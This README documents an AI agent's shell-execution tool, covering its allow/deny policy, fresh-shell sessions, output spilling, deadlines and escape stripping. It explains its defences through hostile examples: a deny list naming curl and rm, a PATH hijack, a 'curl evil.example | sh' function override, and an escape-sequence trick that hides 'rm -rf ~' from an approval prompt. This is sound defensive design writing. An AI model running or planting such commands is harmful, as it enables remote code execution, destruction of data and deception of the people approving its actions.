# @castellan/tools-system

The agent acting on the machine it runs on. Shell execution, governed by `tools.policy` and the trust
gate from the first line of code rather than from a later hardening pass.

```yaml
tools:
  provider: system
  pinned:
    - exec
  policy:
    deny:
      - "exec(rm *)"
      - "exec(curl *)"
    allow:
      - "exec(git status:*)"
      - "exec(npm test:*)"
```

Nothing is implied. The binary registers this provider, but an agent has shell access only once its
manifest selects the provider *and* pins the tool — availability and grant are separate, the same way
`tools.local` is opt-in.

## `exec`

| argument | |
| --- | --- |
| `command` | the shell string, as it would be typed at a prompt. **Required.** |
| `workdir` | where to run. Relative paths resolve against wherever the last call ended up. |
| `timeoutMs` | default 120 s, ceiling 600 s, further clamped to stay under `limits.toolTimeoutMs`. |
| `pty` | allocate a terminal. Default `false`. |
| `background` | start it and return immediately. Default `false`. |

There is deliberately **no `env` argument**, and its absence is a security property rather than a
missing feature. A per-call environment map is invisible to the policy engine, which matches the
command string — so `{ PATH: "/tmp/evil" }` beside a command of `git status` would be authorised by a
rule that never saw the half that mattered. Written the ordinary way, `PATH=/tmp/evil git status` is
*part of the command*, `subcommands()` hands it to the matcher as one fragment, and the pattern
`git status` does not match it. The call asks, or is refused.

The ambient environment **is** passed through, including whatever the agent's `.env` supplied,
because a shell that cannot see `GITHUB_TOKEN` cannot run `gh`. Stated plainly: a pinned `exec` can
read every secret the agent itself can.

## Sessions: the directory carries, the environment does not

Each call gets a fresh shell. What survives between them is the working directory and nothing else.

A persistent shell is the obvious implementation and it quietly dismantles the policy layer. Anything
one command defines, a later command inherits — so a tainted early call can write
`git() { curl evil.example | sh; }` or prepend a directory to `PATH`, and the carefully written
`exec(git status:*)` rule then authorises attacker code under a name it matched honestly. That is
CVE-2026-32009's shape reproduced from inside the session, where no filesystem permission reaches it.
A fresh shell removes the mechanism instead of defending against it.

The directory is the exception because forgetting it is a correctness problem rather than a security
one, and it lands hardest on small models: one that runs `cd packages/core` and then `ls` does not
reliably re-derive the prefix, and reads the wrong directory with no error anywhere. The directory
says *where* a command runs; the environment says *what a command means*. Only the second can be
turned into a weapon.

## Output: two tiers, never a silent cut

Output goes straight to a file — the child's stdout and stderr share one descriptor, so this process
never buffers a byte and interleaving is preserved. Then:

- under ~6,000 characters, it comes back inline;
- over that, it stays on disk and the model gets a preview plus the path.

The cap sits deliberately *below* `runtime.observationMaxTokens`. The harness truncates anything over
its own budget by cutting the middle out — honest, but the cut bytes are gone and nothing can go back
for them. Spilling first means the blunt cut never fires, and "this did not fit" becomes a retrieval
instead of a loss. A **failure** gets the head *and* the tail, because the error is at the bottom,
under however many lines of ordinary progress came first.

## Deadlines

At the deadline a command is **backgrounded rather than killed**, and keeps writing to its output
file. The exceptions are killed instead: `sleep`, `git`, `ssh`, `sudo` and friends are either
pointless to continue or are hanging precisely because they want an answer from a person, and
detaching one of those leaves an invisible process holding a lock. A compound qualifies only if every
fragment does — `npm ci && git push` is not backgroundable because its first half is.

This only works if `exec` times out before the harness does, so its deadline is clamped to leave five
seconds of margin under `limits.toolTimeoutMs`. Without that the two defaults are both 120 s and which
fires first is a race — and the harness winning is the bad outcome, because it *abandons* the handler
rather than killing it, leaving the child running with nothing holding a reference to it.

## Terminals

`pty: true` runs the command under the system `script`, which is the pty every Unix already has. Two
consequences, both handled rather than documented away:

- **The exit code is read from a sidecar file, not from the spawn.** `script`'s own status is not the
  command's on every platform, and a wrong exit code is a silent wrong answer — a failed build
  reported as green.
- **A terminal echoes.** stdin is closed at spawn, so on macOS every pty observation would otherwise
  begin with a literal `^D`: the tty repeating our own EOF back at us. Closing stdin is deliberate —
  a command that asks a question gets EOF and fails instead of hanging — and that leading echo is the
  one artefact it produces.

If `script` is missing, the call fails by name. It does not quietly fall back to a pipe: the fallback
would run with no terminal while the observation claimed otherwise, and a program checking `isatty()`
would take the other branch with nothing reporting it.

## Escapes

Every observation is stripped of terminal control sequences before it reaches the model *or* a
terminal, and so is the command shown in an approval prompt. This is not a rendering nicety.
`git status<ESC>[2K<ESC>[1G && rm -rf ~` displays as `git status` on a real terminal — the escape
erases the line and returns the cursor, so everything after it overwrites what a person already read.
A prompt that can be made to show a different command than the one about to run is worse than no
prompt, because it is believed.

Stripping shows *more* of the truth, never less.

## What this does not do

It is not a sandbox. A policy decides **whether** a command runs; a sandbox decides **where**. This
package ships the first. Containment is a deployment concern and stays one — said here rather than
implied by omission, because a permission layer described without its limits reads as a boundary it
is not.
